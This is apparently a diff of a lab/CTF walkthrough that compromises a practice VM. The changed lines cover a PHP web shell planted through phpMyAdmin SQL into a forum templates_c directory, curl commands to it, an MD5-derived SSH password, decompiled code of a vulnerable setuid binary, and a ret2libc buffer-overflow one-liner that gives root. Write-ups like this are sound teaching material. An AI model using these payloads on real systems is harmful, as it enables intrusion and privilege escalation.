@@ -30,7 +30,7 @@ well now we can connect to the phpmyadmin instance, it's very useful as we can u
 
 trying to write a simple command launcher into the http server directory `SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/backdoor.php"` fails. we need to find a location where we have write access.
 
-maybe with the forum ? looking at the forum source code (mylittleforum) there is multiples directory, trying multiples we find `templates_c` where we can write the file.
+maybe with the forum ? looking at the forum source code (mylittleforum) there is multiples directory, trying multiples we find `templates_c` where we can write the file. since `templates_c` contains user modified templates for the website, the user modified the permissions to modify it.
 
 so now we just have to access it: `curl --insecure https://vm/forum/templates_c/backdoor.php?cmd=whoami` and we are www-data as expected.
 
@@ -437,23 +437,27 @@ with instructions to draw something, and a clue at the end, which probably mean 
 ```
 
 we wrote a simple script to draw the turtle instructions, which reveal the word `SLASH`.
-i tried to ssh with the sha256 of the word, but it didn't work, so i tried with another digest, md5, and it worked.
+i tried to ssh with the sha256 of the word, but it didn't work, so i tried with another digest, md5 (646da671ca01bb5d84dbb5fb2238dc8e), and it worked.
 
 now on the user zaz, there is a empty email folder, and setuid binary, which mean it's run as root, if we can exploit it we can get root access.
 opening the binary in binaryninja we can see it's a simple program that copy a user provided string into a buffer without checking the size. we can make the program write more data than the size of the buffer and overwrite the return address of main to the `system` function with `/bin/sh` as a argument, and get a root shell (ret2libc attack).
 
 ```c
-080483f4  int32_t main(int32_t argc, char** argv, char** envp)
-
-08048404      int32_t eax
-08048404      if (argc s> 1)
-08048420          void str
-08048420          strcpy(&str, argv[1])
-0804842c          puts(str: &str)
-08048431          eax = 0
+080483f4  int32_t main(int32_t argc, char** argv, char** envp) {
+08048404      int32_t eax;
+08048404      if (argc > 1)
+08048400      {
+08048420          void str;
+08048420          strcpy(&str, argv[1]);
+0804842c          puts(&str);
+08048431          eax = 0;
+08048431      }
 08048406      else
-08048406          eax = 1
-08048437      return eax
+08048406      {
+08048406          eax = 1;
+08048406      }
+08048437      return eax;
+08048437  }
 ```
 
 binaryninja tells us `str` have a stack offset of -0x90 (144) and there is a int just before taking 4 bytes, so we know the buffer is 140 bytes long.
@@ -499,6 +503,6 @@ writing our exploit:
 ./exploit_me $(python -c 'print "i"*140 + "\x60\xb0\xe6\xb7" + "i"*4 + "\x58\xcc\xf8\xb7"')
 ```
 
-the four spacer between the address of `system` and the address of `/bin/sh` is to fill the 4 bytes corresponding to the return address of the new stack frame created for system. the argument to a function is right after.
+the four bytes between the address of `system` and the address of `/bin/sh` is to fill the 4 bytes corresponding to the return address of the new stack frame created for system. the argument of the stack frame are right after.
 
 running our exploit and we are root !
